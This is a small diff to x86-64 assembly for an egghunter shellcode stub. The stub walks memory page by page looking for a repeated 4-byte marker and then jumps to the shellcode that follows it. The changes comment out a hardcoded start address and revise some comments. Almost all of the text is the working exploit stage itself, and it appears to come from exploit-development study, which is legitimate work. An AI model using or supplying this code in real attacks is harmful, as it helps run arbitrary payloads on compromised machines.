@@ -6,7 +6,7 @@ section .text
 	global _start
 _start:
 	xor edx, edx
-	mov edx, 0x00600000		; estimate of starting location of egg
+;	mov edx, 0x00600000		; estimate of starting location of egg
 L0:
 	or dx, 0xfff			; prep 4096 PAGE_SIZE boundary - no nulls
 L1:
@@ -23,9 +23,9 @@ _egg:
 	mov eax, 0x50905090		; egg - NOP slide
 	mov edi, edx			; scas base - pointer address 
 
-	scasd				; search for egg in egghunter  then inc 4 bytes
+	scasd				; search for 4 byte egg in egghunter then inc 4 bytes
 	jnz L1				; if egg not found then inc addr one byte 
-	scasd				; search for the egg in egg PROG then inc 4 bytes
+	scasd				; search for the 8 byte egg in egg PROG then inc 4 bytes
 	jnz L1				; if egg not found then advance addr one byte 
 
 	jmp rdi				; egg found, 8 bytes are skipped, execute shellcode
